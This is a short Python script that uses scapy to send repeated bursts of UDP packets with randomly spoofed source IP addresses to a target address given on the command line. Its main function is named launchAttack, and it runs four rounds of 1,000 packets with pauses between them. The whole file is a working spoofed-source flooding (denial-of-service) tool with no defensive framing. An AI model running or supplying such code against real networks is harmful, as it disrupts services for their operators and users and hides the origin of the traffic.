import sys
import time
from os import popen
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp, IP, UDP, Ether, TCP
from random import randrange
import time
import csv
import ast
import random

def generateSourceIP():
    not_valid = [10, 127, 254, 1, 2, 169, 172, 192]
    #removing some non valid ip like loopback

    first = randrange(1, 256)

    while first in not_valid:
        first = randrange(1, 256)
        
    ip = ".".join([str(first), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])
    #generating random ip
    return ip


def launchAttack():
  
  destinationIP = sys.argv[1:]
  #get attack input from cmd line

  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
  #get interface to pump
  
  portSolns = [i for i in range(81, 7899)]
  
  for i in range(0, 1000):
    packets = Ether() / IP(dst = destinationIP, src = generateSourceIP()) / UDP(dport = 1234, sport = random.choice(portSolns))
    
    print(repr(packets))
    sendp(packets, iface = interface.rstrip(), inter = 0.01)
    #creating and sending packets

if __name__=="__main__":
  for i in range(1, 5):
        launchAttack()
        time.sleep(10)
                                                                                                                                                                                                                                                                                                       
